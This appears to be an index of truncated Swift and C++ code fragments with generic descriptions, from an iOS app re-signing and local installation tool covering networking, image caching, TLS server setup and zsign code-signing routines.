355,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Create a request with optional caching and timeout configuration / - Parameters: /   - url: The URL for the request /   - httpMethod: HTTP method (default is GET) /   - timeoutInterval: Timeout interval (default is from NetworkManager.Configuration) / - Returns: The configured URL request","static func build(
url: URL,
httpMethod: String = ""GET"",
timeoutInterval: TimeInterval = NetworkManager.shared.configuration.timeoutInterval
) -> URLRequest {"
356,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","MARK: - NetworkManager Configuration Extension We access configuration directly from the instance property No extension needed here MARK: - Batch Request / A batch of network requests that can be executed together","final class BatchRequest {
// MARK: - Properties

/// Requests in the batch
private var requests: [URLRequest] = []

/// Completion handler for the batch
private var completion: (([Any], [Error]) -> Void)?

/// Results of completed requests"
357,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","Function add - implements add functionality","func add(_ request: URLRequest) -> Self {
lock.lock()
requests.append(request)
lock.unlock()
return self
}

/// Execute all requests in the batch
/// - Parameter completion: Completion handler with results and errors
func execute(completion: @escaping ([Any], [Error]) -> Void) {"
358,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Execute all requests in the batch / - Parameter completion: Completion handler with results and errors","func execute(completion: @escaping ([Any], [Error]) -> Void) {
self.completion = completion

lock.lock()
let requestsCopy = requests
lock.unlock()

// Initialize results and errors arrays
results = Array(repeating: NSNull(), count: requestsCopy.count)
errors = Array(repeating: NetworkError.invalidResponse, count: requestsCopy.count)"
359,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Network/NetworkManager.swift","/ Cancel all requests in the batch","func cancel() {
lock.lock()
let requestsCopy = requests
lock.unlock()

for request in requestsCopy {"
360,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/BundleIdChecker.swift","class BundleIdChecker - implements functionality related to bundle id checker","class BundleIdChecker {
static func shouldModifyBundleId(originalBundleId: String) async -> Bool {"
361,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/BundleIdChecker.swift","Function shouldModifyBundleId - implements shouldmodifybundleid functionality","static func shouldModifyBundleId(originalBundleId: String) async -> Bool {
do {"
362,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift","enum CertData - implements functionality related to cert data","enum CertData {
static func parseMobileProvisioningFile(atPath path: URL) -> Cert? {"
363,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift","Function parseMobileProvisioningFile - implements parsemobileprovisioningfile functionality","static func parseMobileProvisioningFile(atPath path: URL) -> Cert? {
do {"
364,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/CertData.swift","Function copyFile - implements copyfile functionality","static func copyFile(from sourceURL: URL?, to destinationDirectory: URL) throws {
guard let sourceURL = sourceURL else { return }"
365,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ A comprehensive image caching system that handles both memory and disk caching","final class ImageCache {
// MARK: - Singleton

/// Shared instance of the image cache
static let shared = ImageCache()

/// Save an image to the cache for a specific URL
/// - Parameters:
///   - image: The image to save
///   - url: The URL associated with the image"
366,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Save an image to the cache for a specific URL / - Parameters: /   - image: The image to save /   - url: The URL associated with the image","func saveImage(_ image: UIImage, for url: URL) {
// Save to memory cache
let key = url.absoluteString as NSString
memoryCache.setObject(image, forKey: key)

// Save to disk in the background
diskQueue.async { [weak self] in"
367,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","MARK: - Public Interface / Load an image from the given URL, with caching / - Parameters: /   - url: The URL to load the image from /   - placeholder: Optional placeholder image to use while loading /   - downsampling: Whether to downsample the image to target size /   - targetSize: Target size for downsampling (if enabled) /   - completion: Completion handler with the loaded image","func loadImage(from url: URL?,
placeholder: UIImage? = nil,
downsampling: Bool = true,
targetSize: CGSize = CGSize(width: 80, height: 80),
completion: @escaping (UIImage?) -> Void)
{"
368,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Cancel the loading of an image from the given URL / - Parameter url: The URL to cancel loading for","func cancelLoading(for url: URL) {
operationQueue.async(flags: .barrier) { [weak self] in"
369,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Clear all caches (memory and disk)","func clearCache() {
// Clear memory cache
memoryCache.removeAllObjects()

// Clear failed URLs cache
failedURLsQueue.async {"
370,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","MARK: - Private Methods / Download image from URL / - Parameters: /   - url: The URL to download from /   - downsampling: Whether to downsample the image /   - targetSize: Target size for downsampling /   - completion: Completion handler with the downloaded image","private func downloadImage(from url: URL,
downsampling: Bool,
targetSize: CGSize,
completion: @escaping (UIImage?) -> Void)
{"
371,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Load image from disk cache / - Parameter url: The URL of the image / - Returns: The cached image, if available","private func loadImageFromDisk(url: URL) -> UIImage? {
let fileURL = cacheFileURL(for: url)

if fileManager.fileExists(atPath: fileURL.path) {"
372,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Save image to disk cache / - Parameters: /   - image: The image to save /   - url: The URL of the image","private func saveImageToDisk(image: UIImage, url: URL) {
diskQueue.async { [weak self] in"
373,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Get the file URL for caching an image / - Parameter url: The source URL of the image / - Returns: The file URL for caching","private func cacheFileURL(for url: URL) -> URL {
// Use URL's absoluteString hashed as the filename
let urlString = url.absoluteString
let filename = urlString.hash.magnitude.description
return cacheDirectory.appendingPathComponent(filename)
}

/// Downsample an image to reduce memory usage
/// - Parameters:
///   - image: The image to downsample"
374,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Downsample an image to reduce memory usage / - Parameters: /   - image: The image to downsample /   - targetSize: The target size for downsampling / - Returns: The downsampled image","private func downsample(image: UIImage, to targetSize: CGSize) -> UIImage? {
let imageSourceOptions = [kCGImageSourceShouldCache: false] as CFDictionary

guard let data = image.jpegData(compressionQuality: 1.0) else { return nil }"
375,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Handle memory warning notification","@objc private func handleMemoryWarning() {
// Clear memory cache on memory warning
memoryCache.removeAllObjects()
Debug.shared.log(message: ""Cleared image memory cache due to memory warning"", type: .warning)
}

/// Handle app entering background
@objc private func handleAppDidEnterBackground() {"
376,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Handle app entering background","@objc private func handleAppDidEnterBackground() {
// Perform cleanup when app enters background
performCleanup()
}

/// Perform cleanup of disk cache
private func performCleanup() {"
377,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Perform cleanup of disk cache","private func performCleanup() {
diskQueue.async { [weak self] in"
378,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","MARK: - UIImageView Extension","extension UIImageView {
/// Load an image from a URL with caching
/// - Parameters:
///   - url: The URL to load the image from
///   - placeholder: Optional placeholder image to use while loading
func loadImage(from url: URL?, placeholder: UIImage? = nil) {"
379,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Utilities/ImageCache.swift","/ Load an image from a URL with caching / - Parameters: /   - url: The URL to load the image from /   - placeholder: Optional placeholder image to use while loading","func loadImage(from url: URL?, placeholder: UIImage? = nil) {
// Cancel any previous loads
if let url = url {"
380,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift","Function getCertificates - retrieves certificates","func getCertificates(completion: (() -> Void)? = nil) {
let sourceGET = SourceGET()
guard let uri = URL(string: ""https://backloop.dev/pack.json"") else {"
381,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift","Function writeToFile - implements writetofile functionality","func writeToFile(content: String, filename: String) throws {
let path = getDocumentsDirectory().appendingPathComponent(filename)
try content.write(to: path, atomically: true, encoding: .utf8)
}

// Create default empty files to prevent crashes if download fails
func createDefaultFiles() {"
382,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift","Create default empty files to prevent crashes if download fails","func createDefaultFiles() {
do {"
383,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/DownloadCertificate.swift","Function getDocumentsDirectory - retrieves documentsdirectory","func getDocumentsDirectory() -> URL {
let paths = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)
return paths[0]
}
"
384,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+Compute.swift","extension Installer - implements functionality related to installer","extension Installer {
var pongEndpoint: URL {"
385,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+Compute.swift","Function createWhite - creates white","func createWhite(_ r: CGFloat) -> Data {
let renderer = UIGraphicsImageRenderer(size: .init(width: r, height: r))
let image = renderer.image { ctx in"
386,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift","Function getLocalIPAddress - retrieves localipaddress","func getLocalIPAddress() -> String? {
var address: String?
var ifaddr: UnsafeMutablePointer<ifaddrs>?

if getifaddrs(&ifaddr) == 0 {"
387,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift","extension Installer - implements functionality related to installer","extension Installer {
static let commonName = getDocumentsDirectory().appendingPathComponent(""commonName.txt"")

static let sni: String = {"
388,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift","Function setupTLS - sets uptls","static func setupTLS() throws -> TLSConfiguration {
let keyURL = documentsKeyURL
let crtURL = documentsCrtURL

return try TLSConfiguration.makeServerConfiguration(
certificateChain: NIOSSLCertificate
.fromPEMFile(crtURL.path)
.map { NIOSSLCertificateSource.certificate($0) },"
389,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift","extension Installer - implements functionality related to installer","extension Installer {
static func readCommonName() -> String? {"
390,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server+TLS.swift","Function readCommonName - implements readcommonname functionality","static func readCommonName() -> String? {
do {"
391,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","struct AppData - implements functionality related to app data","struct AppData {
var id: String
var version: Int
var name: String
}

class Installer: Identifiable, ObservableObject {"
392,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","class Installer - implements functionality related to installer","class Installer: Identifiable, ObservableObject {
let id: UUID
let app: Application
var package: URL
let port = Int.random(in: 4000 ... 8000)
let metadata: AppData

enum Status {"
393,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","enum Status - implements functionality related to status","enum Status {
case ready
case sendingManifest
case sendingPayload
case completed(Result<Void, Error>)
case broken(Error)
}

@Published var status: Status = .ready
"
394,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","Configure app routes","private func configureRoutes() {
app.get(""*"") { [weak self] req in"
395,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","Handle request based on path","private func handleRequest(_ req: Request) -> Response {
switch req.url.path {"
396,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","Generate install response for the ""i"" endpoint","private func generateInstallResponse() -> Response {
let baseUrl = Preferences.onlinePath ?? Preferences.defaultInstallPath
let urlParams = [
""bundleid=\(metadata.id)"",
""name=\(metadata.name)"",
""version=\(metadata.version)"",
""fetchurl=\(payloadEndpoint.absoluteString)"",
].joined(separator: ""&"")

let encodedParams = urlParams.addingPercentEncoding(withAllowedCharacters: .alphanumerics) ?? """""
397,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","Function shutdownServer - implements shutdownserver functionality","func shutdownServer() {
Debug.shared.log(message: ""Server is shutting down!"")
if needsShutdown {"
398,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","extension Installer - implements functionality related to installer","extension Installer {
private static let env: Environment = {"
399,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Server.swift","Function setupApp - sets upapp","static func setupApp(port: Int) throws -> Application {
let app = Application(env)

app.threadPool = .init(numberOfThreads: 1)

if !Preferences.userSelectedServer {"
400,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","struct ServerPack - implements functionality related to server pack","struct ServerPack: Decodable {
var cert: String
var ca: String
var key: String
var info: ServerPackInfo

private enum CodingKeys: String, CodingKey {"
401,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","enum CodingKeys - implements functionality related to coding keys","private enum CodingKeys: String, CodingKey {
case cert, ca, key1, key2, info
}

init(from decoder: Decoder) throws {"
402,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","struct ServerPackInfo - implements functionality related to server pack info","struct ServerPackInfo: Decodable {
var issuer: Issuer
var domains: Domains
}

struct Issuer: Decodable {"
403,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","struct Issuer - implements functionality related to issuer","struct Issuer: Decodable {
var commonName: String

private enum CodingKeys: String, CodingKey {"
404,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","enum CodingKeys - implements functionality related to coding keys","private enum CodingKeys: String, CodingKey {
case commonName
}
}

struct Domains: Decodable {"
405,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","struct Domains - implements functionality related to domains","struct Domains: Decodable {
var commonName: String

private enum CodingKeys: String, CodingKey {"
406,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Server/Model/ServerPack.swift","enum CodingKeys - implements functionality related to coding keys","private enum CodingKeys: String, CodingKey {
case commonName
}
}
"
407,cpp,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/bundle.cpp","struct stat - implements stat functionality","struct stat statbuf;
stat(strFolder.c_str(), &statbuf);
if (S_ISDIR(statbuf.st_mode))
{"
408,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function OpenFile - implements openfile functionality","return OpenFile(szFile);"
409,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function Init - implements init functionality","return Init(szFile);"
410,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function CloseFile - implements closefile functionality","return CloseFile();"
411,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function ZArchO - implements zarcho functionality","ZArchO *archo = new ZArchO();"
412,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function File - implements file functionality","ZLog::ErrorV("">>> Invalid Macho File (2)!\n"");"
413,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function Write - implements write functionality","ZLog::ErrorV("">>> CodeSign Write(munmap) Failed! Error: %p, %lu, %s\n"", m_pBase, m_sSize, strerror(errno));"
414,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function Sign - implements sign functionality","return Sign(pSignAsset, bForce, strBundleId, strInfoPlistSHA1, strInfoPlistSHA256,
strCodeResourcesData);"
415,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function CloseFile - implements closefile functionality","return CloseFile();"
416,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function OpenFile - implements openfile functionality","return OpenFile(m_strFile.c_str());"
417,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/macho.cpp","Function OpenFile - implements openfile functionality","return OpenFile(m_strFile.c_str());"
418,cpp,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","class COpenSSLInit - implements functionality related to c open s s l init","class COpenSSLInit
{"
419,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","bool CMSError()
{"
420,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function _GenerateCMS - implements  generatecms functionality","bool _GenerateCMS(X509 *scert, EVP_PKEY *spkey, const string &strCDHashData, const string &strCDHashPlist,
const string &strCodeDirectorySlotSHA1, const string &strAltnateCodeDirectorySlot256,
string &strCMSOutput)
{"
421,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
422,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
423,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
424,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
425,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
426,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
427,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
428,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
429,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
430,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
431,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
432,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
433,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
434,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
435,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
436,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
437,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
438,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GenerateCMS - implements generatecms functionality","bool GenerateCMS(const string &strSignerCertData, const string &strSignerPKeyData, const string &strCDHashData,
const string &strCDHashesPlist, string &strCMSOutput)
{"
439,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
440,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
441,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCMSContent - implements getcmscontent functionality","bool GetCMSContent(const string &strCMSDataInput, string &strContentOutput)
{"
442,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
443,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
444,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
445,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCertSubjectCN - implements getcertsubjectcn functionality","bool GetCertSubjectCN(X509 *cert, string &strSubjectCN)
{"
446,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
447,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
448,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
449,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
450,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCertSubjectCN - implements getcertsubjectcn functionality","bool GetCertSubjectCN(const string &strCertData, string &strSubjectCN)
{"
451,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
452,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
453,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCertSubjectCN - implements getcertsubjectcn functionality","return GetCertSubjectCN(cert, strSubjectCN);"
454,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function ParseCertSubject - implements parsecertsubject functionality","void ParseCertSubject(const string &strSubject, JValue &jvSubject)
{"
455,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function ASN1_TIMEtoString - implements asn1 timetostring functionality","string ASN1_TIMEtoString(ASN1_TIME *time)
{"
456,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function ASN1_TIMEtoString - implements asn1 timetostring functionality","string ASN1_TIMEtoString(const ASN1_TIME *time)
{"
457,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCertInfo - implements getcertinfo functionality","bool GetCertInfo(X509 *cert, JValue &jvCertInfo)
{"
458,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
459,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function GetCMSInfo - implements getcmsinfo functionality","bool GetCMSInfo(uint8_t *pCMSData, uint32_t uCMSLength, JValue &jvOutput)
{"
460,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/openssl.cpp","Function CMSError - implements cmserror functionality","return CMSError();"
461,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function _DERLength - implements  derlength functionality","static void _DERLength(string &strBlob, uint64_t uLength)
{"
462,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function _DER - implements  der functionality","static string _DER(const JValue &data)
{"
463,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseGeneralHeader - implements slotparsegeneralheader functionality","uint32_t SlotParseGeneralHeader(const char *szSlotName, uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
464,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseGeneralTailer - implements slotparsegeneraltailer functionality","void SlotParseGeneralTailer(uint8_t *pSlotBase, uint32_t uSlotLength)
{"
465,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseRequirements - implements slotparserequirements functionality","bool SlotParseRequirements(uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
466,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotBuildRequirements - implements slotbuildrequirements functionality","bool SlotBuildRequirements(const string &strBundleID, const string &strSubjectCN, string &strOutput)
{"
467,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseEntitlements - implements slotparseentitlements functionality","bool SlotParseEntitlements(uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
468,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseDerEntitlements - implements slotparsederentitlements functionality","bool SlotParseDerEntitlements(uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
469,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotBuildEntitlements - implements slotbuildentitlements functionality","bool SlotBuildEntitlements(const string &strEntitlements, string &strOutput)
{"
470,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotBuildDerEntitlements - implements slotbuildderentitlements functionality","bool SlotBuildDerEntitlements(const string &strEntitlements, string &strOutput)
{"
471,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseCodeDirectory - implements slotparsecodedirectory functionality","bool SlotParseCodeDirectory(uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
472,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotBuildCodeDirectory - implements slotbuildcodedirectory functionality","bool SlotBuildCodeDirectory(bool bAlternate, uint8_t *pCodeBase, uint32_t uCodeLength, uint8_t *pCodeSlotsData,
uint32_t uCodeSlotsDataLength, uint64_t execSegLimit, uint64_t execSegFlags,
const string &strBundleId, const string &strTeamId, const string &strInfoPlistSHA,
const string &strRequirementsSlotSHA, const string &strCodeResourcesSHA,
const string &strEntitlementsSlotSHA, const string &strDerEntitlementsSlotSHA,
bool isExecuteArch, string &strOutput)
{"
473,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotParseCMSSignature - implements slotparsecmssignature functionality","bool SlotParseCMSSignature(uint8_t *pSlotBase, CS_BlobIndex *pbi)
{"
474,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function SlotBuildCMSSignature - implements slotbuildcmssignature functionality","bool SlotBuildCMSSignature(ZSignAsset *pSignAsset, const string &strCodeDirectorySlot,
const string &strAltnateCodeDirectorySlot, string &strOutput)
{"
475,cpp,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/signing.cpp","Function GetCodeSignatureLength - implements getcodesignaturelength functionality","uint32_t GetCodeSignatureLength(uint8_t *pCSBase)
{"
